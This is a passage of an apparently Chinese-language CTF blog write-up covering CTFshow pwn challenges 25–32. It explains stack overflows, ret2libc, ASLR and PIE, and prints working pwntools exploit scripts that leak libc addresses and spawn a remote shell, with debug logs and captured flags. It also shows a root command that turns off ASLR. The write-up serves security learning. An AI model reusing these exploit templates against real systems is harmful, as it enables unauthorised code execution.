href="https://wiki.wgpsec.org/knowledge/ctf/re2libc.html">https://wiki.wgpsec.org/knowledge/ctf/re2libc.html</a></p><p>你可以使用pwntools的shellcraft模块来进行攻击</p><p>32位程序，使用IDA反编译，看到读入的buf为132个长度，而read()函数限制我们读入的长度位0x100，也就是256个长度，所以ctfshow()函数存在栈溢出。</p><p><img src="C:/Users/17687/AppData/Roaming/Typora/typora-user-images/image-20240527164637420.png?lastModify=1726473725" alt="image-20240527164637420"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">ctfshow@ubuntu:~/Desktop$ objdump -d -j .plt pwn</span><br><span class="line"></span><br><span class="line">pwn:     file format elf32-i386</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .plt:</span><br><span class="line"></span><br><span class="line">08048370 &lt;.plt&gt;:</span><br><span class="line"> 8048370:   ff 35 04 a0 04 08       pushl  0x804a004</span><br><span class="line"> 8048376:   ff 25 08 a0 04 08       jmp    *0x804a008</span><br><span class="line"> 804837c:   00 00                   add    %al,(%eax)</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">08048380 &lt;read@plt&gt;:</span><br><span class="line"> 8048380:   ff 25 0c a0 04 08       jmp    *0x804a00c</span><br><span class="line"> 8048386:   68 00 00 00 00          push   $0x0</span><br><span class="line"> 804838b:   e9 e0 ff ff ff          jmp    8048370 &lt;.plt&gt;</span><br><span class="line"></span><br><span class="line">08048390 &lt;puts@plt&gt;:</span><br><span class="line"> 8048390:   ff 25 10 a0 04 08       jmp    *0x804a010</span><br><span class="line"> 8048396:   68 08 00 00 00          push   $0x8</span><br><span class="line"> 804839b:   e9 d0 ff ff ff          jmp    8048370 &lt;.plt&gt;</span><br><span class="line"></span><br><span class="line">080483a0 &lt;__libc_start_main@plt&gt;:</span><br><span class="line"> 80483a0:   ff 25 14 a0 04 08       jmp    *0x804a014</span><br><span class="line"> 80483a6:   68 10 00 00 00          push   $0x10</span><br><span class="line"> 80483ab:   e9 c0 ff ff ff          jmp    8048370 &lt;.plt&gt;</span><br><span class="line"></span><br><span class="line">080483b0 &lt;write@plt&gt;:</span><br><span class="line"> 80483b0:   ff 25 18 a0 04 08       jmp    *0x804a018</span><br><span class="line"> 80483b6:   68 18 00 00 00          push   $0x18</span><br><span class="line"> 80483bb:   e9 b0 ff ff ff          jmp    8048370 &lt;.plt&gt;</span><br><span class="line"></span><br><span class="line">080483c0 &lt;setvbuf@plt&gt;:</span><br><span class="line"> 80483c0:   ff 25 1c a0 04 08       jmp    *0x804a01c</span><br><span class="line"> 80483c6:   68 20 00 00 00          push   $0x20</span><br><span class="line"> 80483cb:   e9 a0 ff ff ff          jmp    8048370 &lt;.plt&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用cyclic计算栈偏移量，得出栈偏移量为140</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ctfshow@ubuntu:~/Desktop$ cyclic 200</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span><br><span class="line">ctfshow@ubuntu:~/Desktop$ cyclic -l 0x6261616b</span><br><span class="line">140</span><br></pre></td></tr></table></figure><p>使用objdump查看plt表中的函数，我们看到plt表中有puts函数也有write函数，这里我们使用puts函数来输出函数的内存地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">ctfshow@ubuntu:~/Desktop$ objdump -d -j .plt pwn</span><br><span class="line"></span><br><span class="line">pwn:     file format elf32-i386</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .plt:</span><br><span class="line"></span><br><span class="line">08048370 &lt;.plt&gt;:</span><br><span class="line"> 8048370:ff 35 04 a0 04 08    pushl  0x804a004</span><br><span class="line"> 8048376:ff 25 08 a0 04 08    jmp    *0x804a008</span><br><span class="line"> 804837c:00 00                add    %al,(%eax)</span><br><span class="line">...</span><br><span class="line">#######</span><br><span class="line">08048380 &lt;read@plt&gt;:</span><br><span class="line"> 8048380:ff 25 0c a0 04 08    jmp    *0x804a00c</span><br><span class="line"> 8048386:68 00 00 00 00       push   $0x0</span><br><span class="line"> 804838b:e9 e0 ff ff ff       jmp    8048370 &lt;.plt&gt;</span><br><span class="line">########</span><br><span class="line">08048390 &lt;puts@plt&gt;:</span><br><span class="line"> 8048390:ff 25 10 a0 04 08    jmp    *0x804a010</span><br><span class="line"> 8048396:68 08 00 00 00       push   $0x8</span><br><span class="line"> 804839b:e9 d0 ff ff ff       jmp    8048370 &lt;.plt&gt;</span><br><span class="line"></span><br><span class="line">080483a0 &lt;__libc_start_main@plt&gt;:</span><br><span class="line"> 80483a0:ff 25 14 a0 04 08    jmp    *0x804a014</span><br><span class="line"> 80483a6:68 10 00 00 00       push   $0x10</span><br><span class="line"> 80483ab:e9 c0 ff ff ff       jmp    8048370 &lt;.plt&gt;</span><br><span class="line"> </span><br><span class="line"> #######</span><br><span class="line">080483b0 &lt;write@plt&gt;:</span><br><span class="line"> 80483b0:ff 25 18 a0 04 08    jmp    *0x804a018</span><br><span class="line"> 80483b6:68 18 00 00 00       push   $0x18</span><br><span class="line"> 80483bb:e9 b0 ff ff ff       jmp    8048370 &lt;.plt&gt;</span><br><span class="line"></span><br><span class="line">080483c0 &lt;setvbuf@plt&gt;:</span><br><span class="line"> 80483c0:ff 25 1c a0 04 08    jmp    *0x804a01c</span><br><span class="line"> 80483c6:68 20 00 00 00       push   $0x20</span><br><span class="line"> 80483cb:e9 a0 ff ff ff       jmp    8048370 &lt;.plt&gt;</span><br></pre></td></tr></table></figure><p>exp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"> </span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line"> </span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28278)</span><br><span class="line">elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="line">libc = ELF(&#x27;/home/ctfshow/libc/32bit/libc-2.27.so&#x27;)</span><br><span class="line"> </span><br><span class="line">offset = 0x88 + 0x4  # 溢出偏移地址</span><br><span class="line">main_addr = elf.symbols[&#x27;main&#x27;]  # main函数地址</span><br><span class="line">puts_plt = elf.plt[&#x27;puts&#x27;]  # plt表中puts函数地址</span><br><span class="line">puts_got = elf.got[&#x27;puts&#x27;]  # got表中puts函数地址</span><br><span class="line"> </span><br><span class="line"># payload：0x88+0x4个无用填充字符覆盖到返回地址，</span><br><span class="line"># 将puts函数plt表地址做返回地址，代表ctfshow函数执行完会执行puts函数，</span><br><span class="line"># main_addr是puts函数执行完后的返回地址，使用puts函数执行完后回到main函数继续利用溢出漏洞</span><br><span class="line"># puts函数got表中的地址作为puts函数执行的参数，让puts函数输出puts函数在内存的地址</span><br><span class="line">payload = offset * &#x27;a&#x27; + p32(puts_plt) + p32(main_addr) + p32(puts_got)</span><br><span class="line"># 发送payload</span><br><span class="line">p.sendline(payload)</span><br><span class="line"># 接收puts函数输出的puts函数在内存的地址</span><br><span class="line">puts_addr = u32(p.recv()[0:4])</span><br><span class="line">print(hex(puts_addr))</span><br><span class="line"> </span><br><span class="line"># 在根据内存中puts函数的地址寻找相应的libc版本中puts函数的地址</span><br><span class="line">libc_base = puts_addr - libc.symbols[&#x27;puts&#x27;]</span><br><span class="line">print(hex(libc_base))</span><br><span class="line"> </span><br><span class="line"># 计算 system 函数的地址</span><br><span class="line">system_addr = libc_base + libc.symbols[&#x27;system&#x27;]</span><br><span class="line"> </span><br><span class="line"># 计算 &quot;/bin/sh&quot; 字符串的地址</span><br><span class="line">binsh_addr = libc_base + next(libc.search(&#x27;/bin/sh&#x27;))</span><br><span class="line"> </span><br><span class="line"># 构造 payload 发送给程序</span><br><span class="line">payload = offset * &#x27;a&#x27; + p32(system_addr) + &#x27;aaaa&#x27; + p32(binsh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br><span class="line">ctfshow@ubuntu:~/Desktop$ python 11.py</span><br><span class="line">[+] Opening connection to pwn.challenge.ctf.show on port 28278: Done</span><br><span class="line">[*] &#x27;/home/ctfshow/Desktop/pwn&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">[*] &#x27;/home/ctfshow/libc/32bit/libc-2.27.so&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[DEBUG] Sent 0x99 bytes:</span><br><span class="line">    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│</span><br><span class="line">    *</span><br><span class="line">    00000080  61 61 61 61  61 61 61 61  61 61 61 61  90 83 04 08  │aaaa│aaaa│aaaa│····│</span><br><span class="line">    00000090  2d 86 04 08  10 a0 04 08  0a                        │-···│····│·│</span><br><span class="line">    00000099</span><br><span class="line">[DEBUG] Received 0x11 bytes:</span><br><span class="line">    00000000  60 13 df f7  90 2d da f7  b6 83 04 08  c0 1a df f7  │`···│·-··│····│····│</span><br><span class="line">    00000010  0a                                                  │·│</span><br><span class="line">    00000011</span><br><span class="line">0xf7df1360</span><br><span class="line">0xf7d8a000</span><br><span class="line">[DEBUG] Sent 0x99 bytes:</span><br><span class="line">    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│</span><br><span class="line">    *</span><br><span class="line">    00000080  61 61 61 61  61 61 61 61  61 61 61 61  10 6d dc f7  │aaaa│aaaa│aaaa│·m··│</span><br><span class="line">    00000090  61 61 61 61  cf 58 f0 f7  0a                        │aaaa│·X··│·│</span><br><span class="line">    00000099</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ cat flag</span><br><span class="line">[DEBUG] Sent 0x9 bytes:</span><br><span class="line">    &#x27;cat flag\n&#x27;</span><br><span class="line">[DEBUG] Received 0x2e bytes:</span><br><span class="line">    &#x27;ctfshow&#123;8b046493-c3e3-4c64-bcd0-3e78fe5b80d2&#125;\n&#x27;</span><br><span class="line">ctfshow&#123;8b046493-c3e3-4c64-bcd0-3e78fe5b80d2&#125;</span><br></pre></td></tr></table></figure><h3 id="pwn26"><a href="#pwn26" class="headerlink" title="pwn26"></a>pwn26</h3><h4 id="什么是ASLR"><a href="#什么是ASLR" class="headerlink" title="什么是ASLR"></a>什么是ASLR</h4><p>大多数的攻击都基于这样一个前提，即攻击者知道程序的内存布局，需要提前知道shellcode或者其他一些数据的位置。因此，引入内存布局的随机化能够有效增加漏洞利用的难度，其中一种技术就是ASLR（Address Space Layout Randomization）。ASLR提供的只是概率上的安全性，根据用于随机化的熵，攻击者有可能幸运地猜到正确的地址，有时攻击者还可以爆破。</p><p>在Linux上，ASLR的全局配置&#x2F;proc&#x2F;sts&#x2F;kernel&#x2F;randomize_va_space有三种情况：0表示关闭ASLR；1表示部分开启（将mmap的基址，stack和vdso页面随机化）；2表示完全开启（在部分开启的基础上增加heap的随机化）。如下： 在这里插入图片描述 我们可以修改&#x2F;proc&#x2F;sts&#x2F;kernel&#x2F;randomize_va_space文件的值来配置ASLR。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">su root</span><br><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">./pwn</span><br></pre></td></tr></table></figure><h3 id="pwn27"><a href="#pwn27" class="headerlink" title="pwn27"></a>pwn27</h3><p>这道题目相较于上道题目，是&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space这个文件的内容为0或者1都可以得到正确的flag。由于我们在上到题目中已经把&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space这个文件中的内容改为了0，所以我们直接运行pwn文件就能拿到flag了。</p><h3 id="pwn28"><a href="#pwn28" class="headerlink" title="pwn28"></a>pwn28</h3><p>这道题目比前两道题好像还简单，什么限制都没有，直接运行就能拿flag，天大的好事呀！！！</p><h3 id="pwn29"><a href="#pwn29" class="headerlink" title="pwn29"></a>pwn29</h3><h4 id="什么是PIE"><a href="#什么是PIE" class="headerlink" title="什么是PIE"></a>什么是PIE</h4><p>由于ASLR是一种操作系统层面的技术，而二进制程序本身是不支持随机化加载的，便出现了一些绕过方法，例如ret2plt、GOT劫持、地址爆破等。于是，人们于2003年引入了位置无关可执行文件（Position-Independent Executable，PIE）。它在应用层的编译器实现，通过将程序编译为位置无关代码（Position-Independent Code，PIC），使程序可以被加载到任意位置，就像是一个特殊的共享库。在PIE和ASLR同时开启的情况下，攻击者将对程序的内存布局一无所知，大大增加了利用难度。然而在增加安全性的同时，PIE也会一定程度上影响性能，因此在大多数操作系统上PIE仅用于一些对安全性要求比较高的程序。</p><p>ASLR和PIE开启后，</p><p>大致逻辑就是，先把&#x2F;proc&#x2F;sts&#x2F;kernel&#x2F;randomize_va_space的内容更改为2，也就是将ASLR全开启，然后输出了main函数和system函数的地址，有输出了变量的堆栈的信息，最后打印一条消息，说明所有的保护机制都开了，地址全部都是随机化的！然后就会为我们输出flag了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/ctfshow/Desktop# ./pwn</span><br><span class="line">    ▄▄▄▄   ▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄            ▄▄                           </span><br><span class="line">  ██▀▀▀▀█  ▀▀▀██▀▀▀  ██▀▀▀▀▀▀            ██                           </span><br><span class="line"> ██▀          ██     ██        ▄▄█████▄  ██▄████▄   ▄████▄  ██      ██</span><br><span class="line"> ██           ██     ███████   ██▄▄▄▄ ▀  ██▀   ██  ██▀  ▀██ ▀█  ██  █▀</span><br><span class="line"> ██▄          ██     ██         ▀▀▀▀██▄  ██    ██  ██    ██  ██▄██▄██ </span><br><span class="line">  ██▄▄▄▄█     ██     ██        █▄▄▄▄▄██  ██    ██  ▀██▄▄██▀  ▀██  ██▀ </span><br><span class="line">    ▀▀▀▀      ▀▀     ▀▀         ▀▀▀▀▀▀   ▀▀    ▀▀    ▀▀▀▀     ▀▀  ▀▀  </span><br><span class="line">    * *************************************                           </span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门                              </span><br><span class="line">    * Type  : Linux_Security_Mechanisms                               </span><br><span class="line">    * Site  : https://ctf.show/                                       </span><br><span class="line">    * Hint  : Please confirm your ASLR level first !                  </span><br><span class="line">    * *************************************                           </span><br><span class="line">Here is your ASLR level:</span><br><span class="line">2</span><br><span class="line">Let&#x27;s take a look at protection:</span><br><span class="line">[*] Checking for new versions of pwntools</span><br><span class="line">    To disable this functionality, set the contents of /root/.cache/.pwntools-cache-2.7/update to &#x27;never&#x27; (old way).</span><br><span class="line">    Or add the following lines to ~/.pwn.conf (or /etc/pwn.conf system-wide):</span><br><span class="line">        [update]</span><br><span class="line">        interval=never</span><br><span class="line">[*] A newer version of pwntools is available on pypi (4.2.1 --&gt; 4.12.0).</span><br><span class="line">    Update with: $ pip install -U pwntools</span><br><span class="line">[*] &#x27;/home/ctfshow/Desktop/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">executable: 0x55555555483a</span><br><span class="line">system@plt: 0x7ffff782d420</span><br><span class="line">heap: 0x555555757260</span><br><span class="line">stack: 0x7fffffffe324</span><br><span class="line">As you can see, the protection has been fully turned on and the address has been completely randomized!</span><br><span class="line">Here is your flag:</span><br><span class="line">ctfshow&#123;Address_Space_Layout_Randomization&amp;&amp;Position-Independent_Executable_1s_C0000000000l!&#125;</span><br></pre></td></tr></table></figure><h3 id="pwn30"><a href="#pwn30" class="headerlink" title="pwn30"></a>pwn30</h3><h5 id="关闭PIE后-程序的基地址固定，攻击者可以更容易地确定内存中函数和变量的位置。"><a href="#关闭PIE后-程序的基地址固定，攻击者可以更容易地确定内存中函数和变量的位置。" class="headerlink" title="关闭PIE后 程序的基地址固定，攻击者可以更容易地确定内存中函数和变量的位置。"></a><strong>关闭PIE后 程序的基地址固定，攻击者可以更容易地确定内存中函数和变量的位置。</strong></h5><p>依旧是一个溢出漏洞，内存占用情况和pwn25也是一样的</p><p>那么可以利用和pwn25一样的exp，利用ret2libc泄露puts函数的地址，进而发送payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;, &quot;28119&quot;)</span><br><span class="line">elf = ELF(&quot;./pwn&quot;)</span><br><span class="line"></span><br><span class="line">offset = 0x88 + 0x4</span><br><span class="line">main_addr = elf.symbols[&#x27;main&#x27;]</span><br><span class="line">puts_plt = elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line">payload = offset * b&#x27;a&#x27; + p32(puts_plt) + p32(main_addr) + p32(puts_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">puts_addr = u32(p.recv()[0:4])</span><br><span class="line">print(hex(puts_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&quot;puts&quot;, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(&quot;puts&quot;)</span><br><span class="line">print(hex(libc_base))</span><br><span class="line">system_addr = libc_base + libc.dump(&quot;system&quot;)</span><br><span class="line">binsh_addr = libc_base + libc.dump(&quot;str_bin_sh&quot;)</span><br><span class="line">payload = offset * b&#x27;a&#x27; + p32(system_addr) + b&#x27;a&#x27; * 4 + p32(binsh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="pwn31"><a href="#pwn31" class="headerlink" title="pwn31"></a>pwn31</h3><h5 id="开启-ASLR-和-PIE-的情况下，仍可能被利用"><a href="#开启-ASLR-和-PIE-的情况下，仍可能被利用" class="headerlink" title="开启 ASLR 和 PIE 的情况下，仍可能被利用"></a>开启 ASLR 和 PIE 的情况下，仍可能被利用</h5><p>虽然程序每次运行的基址会变,但程序中的各段的相对偏移是不会变的，只要泄露出来一个地址，通过IDA静态的看他的程序地址,就能算出基址,从而实现绕过。</p><p>这里程序中有输出main函数地址的语句，那么就得到了运行时main函数的地址，减去main函数的静态地址，就是函数地址的偏移量了</p><p>用程序表示就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;, &quot;端口号&quot;)</span><br><span class="line">elf = ELF(&quot;./pwn&quot;)</span><br><span class="line">main_real_addr = int(p.recv().strip(),16)</span><br><span class="line">base_addr = main_real_addr - elf.sym[&#x27;main&#x27;]</span><br></pre></td></tr></table></figure><p>知道了函数地址偏移量，还需要知道溢出的偏移量，输入下面的命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb pwn      #用gdb打开文件</span><br><span class="line">cyclic 200     #输出200个无用字符</span><br></pre></td></tr></table></figure><p>可以看到输出了200个无用字符，都复制下来</p><p>再输入r运行程序，可以看到main函数的地址被输出了。接着将刚才复制的200个字符粘贴作为输入，可以看到又输出了一个地址并报错了，这是因为栈溢出，程序给出了一个无效地址，而这个地址就是被覆盖后的ctfshow函数的返回地址</p><p>再输入cyclic -l 0x6261616b就能得到栈溢出的偏移量，是140</p><p>由此得到了两个数据，一个是函数地址的偏移量，一个是栈溢出的偏移量，根据这两个数据改写之前的ret2libc脚本，下面是其他博客里py来的exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;, 28173)</span><br><span class="line">elf = ELF(&quot;./pwn&quot;)</span><br><span class="line"></span><br><span class="line">main_real_addr = int(p.recv().strip(), 16)</span><br><span class="line">print(hex(main_real_addr))</span><br><span class="line">base_addr = main_real_addr - elf.sym[&#x27;main&#x27;]</span><br><span class="line"># 获得了内存中真实的main地址，再减去程序中的main函数的地址就能得到程序中函数在内存中的偏移</span><br><span class="line"></span><br><span class="line">puts_plt = base_addr + elf.sym[&#x27;puts&#x27;]</span><br><span class="line">puts_got = base_addr + elf.got[&#x27;puts&#x27;]</span><br><span class="line">ctfshow_addr = base_addr + elf.sym[&#x27;ctfshow&#x27;]</span><br><span class="line">ebx = base_addr + 0x1fc0</span><br><span class="line">payload = 132 * b&#x27;a&#x27; + p32(ebx) + 4 * b&#x27;a&#x27; + p32(puts_plt) + p32(main_real_addr) + p32(puts_got)</span><br><span class="line">p.send(payload)</span><br><span class="line">puts_addr = u32(p.recv()[0:4])</span><br><span class="line">print(hex(puts_addr))</span><br><span class="line"># 通过got表中puts函数的地址打印出puts函数真实的地址</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&quot;puts&quot;, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)</span><br><span class="line">system_addr = libc_base + libc.dump(&quot;system&quot;)</span><br><span class="line">binsh_addr = libc_base + libc.dump(&quot;str_bin_sh&quot;)</span><br><span class="line"># 找到libc，通过libc找到system、/bin/sh</span><br><span class="line"></span><br><span class="line">payload = 140 * b&#x27;a&#x27; + p32(system_addr) + p32(ctfshow_addr) + p32(binsh_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>对于上面的exp，以下为详解：</p><p>1.与服务器建立连接后先利用main函数获得函数地址的偏移量base_addr，也就是所谓的基址</p><p>2.利用基址得到puts函数在plt和got表中的真实地址</p><p>3.发送payload，利用got表得到puts函数真实的地址</p><p>4.利用puts函数的真实地址得到libc库的基址，进而得到libc库中system函数和&#x2F;bin&#x2F;sh的地址</p><p>5.再次发送payload获得shell</p><p>其中第一个payload出现了ebx，这是因为ctfshow函数的最后有一条mov指令，其中的ebx寄存器不能被覆盖，所以需要将其真实的地址放到payload中。ebx是由__x86.get_pc_thunk.bx得到的，它将下一条指令的地址赋给ebx寄存器，然后通过加上一个偏移，得到当前进程GOT表的地址，并以此作为后续操作的基地址。</p><p>用readelf -S pwn命令可以知道got表的初始地址为0x001fc0，因此ebx的真实地址为base_addr + 0x1fc0</p><p>运行脚本得到flag</p><h3 id="pwn32"><a href="#pwn32" class="headerlink" title="pwn32"></a>pwn32</h3><h5 id="FORTIFY-SOURCE-x3D-0：-禁用-Fortify-功能。-不会进行任何额外的安全检查。-可能导致潜在的安全漏洞。"><a href="#FORTIFY-SOURCE-x3D-0：-禁用-Fortify-功能。-不会进行任何额外的安全检查。-可能导致潜在的安全漏洞。" class="headerlink" title="FORTIFY_SOURCE&#x3D;0： 禁用 Fortify 功能。 不会进行任何额外的安全检查。 可能导致潜在的安全漏洞。"></a>FORTIFY_SOURCE&#x3D;0： 禁用 Fortify 功能。 不会进行任何额外的安全检查。 